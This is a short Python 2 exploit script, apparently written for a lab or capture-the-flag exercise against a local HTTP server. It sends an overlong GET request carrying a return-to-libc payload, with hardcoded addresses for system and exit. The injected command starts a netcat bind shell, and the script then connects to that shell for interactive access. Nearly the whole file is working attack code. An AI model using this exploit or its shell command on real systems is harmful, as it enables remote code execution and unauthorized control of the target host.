#!/usr/bin/env python
from struct import pack
import sys
import socket
import time
from console import console

if len(sys.argv) != 3:
    sys.exit("Usage: %s PORT LISTEN_PORT" % sys.argv[0])

port = int(sys.argv[1])
sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))

p = ''
#p += pack('<I', 0xb7e54310)

p += pack('<I', 0xf7e59080) #system
p += pack('<I', 0x08048bb4) #exit
p += pack('<I', 0xffffcc10) #cmd
p += pack('<I', 0xffffc850)
p += pack('<I', 0xffffc850)
p += ' '*90
p += "bash -c 'coproc p { /bin/bash 2>&1; }; nc -l 127.0.0.1 "+sys.argv[2]+" <&${p[0]} >&${p[1]}'    "

sock.sendall("GET /"+" "+'w'*119+p+"\r\n\r\n")
#sock.sendall("GET /aaa"+" "+'a'*95+"abcdefghijklmnopqrstuvwx"+c+"34567890"+p+p+"abcdefgh\r\n\r\n")

#sock.close()
time.sleep(2)
print "connecting ..."
port = int(sys.argv[2])
sock = socket.create_connection(('127.0.0.1', port),
                                socket.getdefaulttimeout(),
                                ('127.0.0.1', 0))
print "connected"
console(sock)
